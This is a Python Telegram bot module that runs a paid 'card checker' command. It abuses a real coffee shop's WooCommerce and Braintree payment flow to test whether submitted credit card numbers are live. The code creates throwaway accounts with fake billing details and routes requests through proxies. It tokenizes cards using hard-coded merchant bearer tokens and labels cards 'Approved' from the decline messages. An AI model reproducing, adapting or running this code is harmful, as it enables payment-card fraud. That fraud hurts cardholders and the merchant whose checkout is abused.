import requests as r
import string, random, re, time
from src.assets.functions import antispam
from src.assets.Db import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

session = r.Session()
BIN_API = "https://bins.antipublic.cc/bins/"

proxy = {
    'http': 'http://38.154.227.167:5868',
    'http': 'http://185.199.229.156:7492'
}


@Client.on_message(filters.command(["shell", "sh"], ["/", ",", ".", ";"]))
async def jaico(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await getLive(card, msg) 

def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12)  # Longitud aleatoria del nombre de usuario
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo   

async def getLive(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    card = card_details[0]
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]
    email = email_generator()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page and woo commerce nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    initial_time = time.perf_counter()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    response = session.get('https://virtualcoffee.com/my-account/edit-address/', headers=headers, proxies=proxy)
    woocommerce_register_nonce = getStr(response.text, '"woocommerce-register-nonce" value="', '" /><input')


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: register and edit address ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://virtualcoffee.com',
        'Connection': 'keep-alive',
        'Referer': 'https://virtualcoffee.com/my-account/edit-address/',
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'email': email,
        'woocommerce-register-nonce': woocommerce_register_nonce,
        '_wp_http_referer': '/my-account/edit-address/',
        'register': 'Register',
    }

    response = session.post('https://virtualcoffee.com/my-account/edit-address/', headers=headers, data=data)

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': 'https://virtualcoffee.com/my-account/edit-address/',
        'Upgrade-Insecure-Requests': '1',
    }

    response = session.get('https://virtualcoffee.com/my-account/edit-address/billing/', headers=headers, proxies=proxy)
    woocommerce_edit_address_nonce = getStr(response.text, 'name="woocommerce-edit-address-nonce" value="', '" /><input type="hidden"')




# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://virtualcoffee.com',
        'Connection': 'keep-alive',
        'Referer': 'https://virtualcoffee.com/my-account/edit-address/billing/',
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'billing_first_name': 'Leonel',
        'billing_last_name': 'Molina',
        'billing_company': 'Quack.Inc',
        'billing_country': 'US',
        'billing_address_1': '874 av park',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '78908492',
        'billing_email': email,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': woocommerce_edit_address_nonce,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }

    response = session.post('https://virtualcoffee.com/my-account/edit-address/billing/', headers=headers, data=data, proxies=proxy)
    await msg.edit_text("1", parse_mode=ParseMode.MARKDOWN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://virtualcoffee.com/my-account/payment-methods/',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    response = session.get('https://virtualcoffee.com/my-account/add-payment-method/', headers=headers, proxies=proxy)
    woocommerce_add_payment_method_nonce = getStr(response.text, 'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '" /><input type="hidden"')
    await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)



# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE2MzE3NTYsImp0aSI6Ijk1NjQ3YWJiLTM1NDEtNGFiYy1hMGU4LTEwNmU0ZWJmMWE1MSIsInN1YiI6InBtM3NwNm1wMmJxdG56cDkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBtM3NwNm1wMmJxdG56cDkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiT25saW5lQmFyaXN0YVRyYWluaW5nX2luc3RhbnQifX0.CQWUN1wZffymDQr36JXZLZhUqKXJViP8y2jOTiv6qAJ5Z9-FCEE9YkwTOS5Il6vKfOLGHob6GFH1XCUiPxcsGw',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Connection': 'keep-alive',
        'Referer': 'https://assets.braintreegateway.com/',
    }

    json_data = {
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card,
                    'expirationMonth': month,
                    'expirationYear': year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': '874 av park',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
    braintree_cc_nonce_key = getStr(response.text, '"token":"', '","creditCard"')
    await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE2MzIyMDQsImp0aSI6ImM0ZTRlZjA4LTA5NzItNDAzYy1hMjJiLTQ2NDZmZDg0NDZmMyIsInN1YiI6InBtM3NwNm1wMmJxdG56cDkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBtM3NwNm1wMmJxdG56cDkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiT25saW5lQmFyaXN0YVRyYWluaW5nX2luc3RhbnQifX0.U51UPmAQqayhfCSD3WlMwuyNuEYUaSbnYupqShl6o52qQo2BkiQ-aLsrA62kd1U6lXHaSGnnss2c41I-NVwqFQ',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://virtualcoffee.com',
        'Connection': 'keep-alive',
        'Referer': 'https://virtualcoffee.com/',
    }

    json_data = {
        'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
        'operationName': 'ClientConfiguration',
    }

    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
    await msg.edit_text("4", parse_mode=ParseMode.MARKDOWN)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://virtualcoffee.com',
        'Connection': 'keep-alive',
        'Referer': 'https://virtualcoffee.com/my-account/add-payment-method/',
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': braintree_cc_nonce_key,
        'braintree_cc_device_data': '{"device_session_id":"fa5bb2086c6217c4f59e2ea4befc77c4","fraud_merchant_id":null,"correlation_id":"6c9d17eb7d2ee6497b8f39e90aa31621"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/pm3sp6mp2bqtnzp9/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/pm3sp6mp2bqtnzp9"},"merchantId":"pm3sp6mp2bqtnzp9","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE2MzE3MjIsImp0aSI6ImQwZjM3MWYwLTBjZDctNDU2Ni1iYjVjLWIyMDkxYzg5NDVmZSIsInN1YiI6InBtM3NwNm1wMmJxdG56cDkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBtM3NwNm1wMmJxdG56cDkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplIiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.oC3Mx_K9_2p1uuly88jpJzU6uASuerpsNCHd4HZ5hNijnstGfh7XJNXy28SP0g-dolXwxndgyQmVVQqPKZR99Q","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
        'woocommerce-add-payment-method-nonce': woocommerce_add_payment_method_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = session.post('https://virtualcoffee.com/my-account/add-payment-method/', headers=headers, data=data, proxies=proxy)
    conver_proxy = re.sub(r'[^a-zA-Z0-9\s.:]+', '', str(proxy)).split(":")[2]
    hide_ip = conver_proxy.split('.')
    hide_ip[-3:] = ['x'] * 3
    show_ip= '.'.join(hide_ip)
    BIN = card[0:6]
    data = r.get(BIN_API+BIN).json()
    final_time = time.perf_counter() - initial_time
    try:
        response_code = getStr(response.text, 'There was an error saving your payment method. Reason:', '''</li>
	</ul>
</div>	<form id="add_payment_method" method="post">''')
    
    

        if "Card Issuer Declined CVV" in response_code:
            msg = await msg.edit_text(f"""<b>Card Approved</b> ✅ -» <b>ccn</b>
━━━━━━━━━━━
┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Response:</b> {response_code}
└ <b>Gateway: Braintree Auth</b>

┌ <b>Bin</b> <code>{data['bin']}</code>
├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
├ <code>{data['bank']}</code>
└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}

┌ <b>Proxy:</b> {show_ip} ✅
└ <b>Time</b> : {final_time:0.2}""")

        elif "CVV." in response_code:
            msg = await msg.edit_text(f"""<b>Card Approved</b> ✅ -» <b>ccn</b>
━━━━━━━━━━━
┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
├ <b>Response:</b> {response_code}
└ <b>Gateway: Braintree Auth</b>

┌ <b>Bin</b> <code>{data['bin']}</code>
├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
├ <code>{data['bank']}</code>
└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}

┌ <b>Proxy:</b> {show_ip} ✅
└ <b>Time</b> : {final_time:0.2}""")
            
        else:
            msg = await msg.edit_text(f"""<b>Unable to verified, please try again.</b> ❌""")
    session.cookies.clear()
    session.close()